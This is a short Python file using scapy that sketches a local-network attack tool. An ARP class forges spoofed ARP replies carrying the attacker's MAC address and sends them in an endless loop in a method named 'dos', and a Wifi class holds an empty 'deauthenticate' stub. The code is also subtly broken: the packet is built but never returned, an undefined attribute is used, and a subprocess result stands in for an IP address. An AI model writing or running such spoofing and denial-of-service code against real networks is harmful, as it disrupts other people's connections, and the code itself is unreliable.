from scapy.all import *
from library.lib import *
import subprocess


class ARP :
    def __init__(self,target_ip) :
        self.target = target_ip
        self.running = False
        self.attacker_MAC = get_mac_adress()
        self.reply = self.create_arp_reply
        self.arp_cash = arp_cash(target_ip)

    def create_arp_reply(self):
        Ether(dst=self.mac)/ARP(op=2,
                                pdst=self.target,
                                hwdst=self.arp_cash[self.target],
                                psrc=subprocess.run("hostname -I",shell=True,stdout=subprocess.PIPE,text=True),
                                hwsrc=self.attacker_MAC)
        
    def dos(self) : 
        self.running = True
        try :
            while self.running :
                sendp(self.reply,iface=conf.iface)
        except KeyboardInterrupt :
            pass

        finally :
            self.running = False


class Wifi : 
    def __init__(self) -> None:
        pass
    def deauthenticate():
        pass

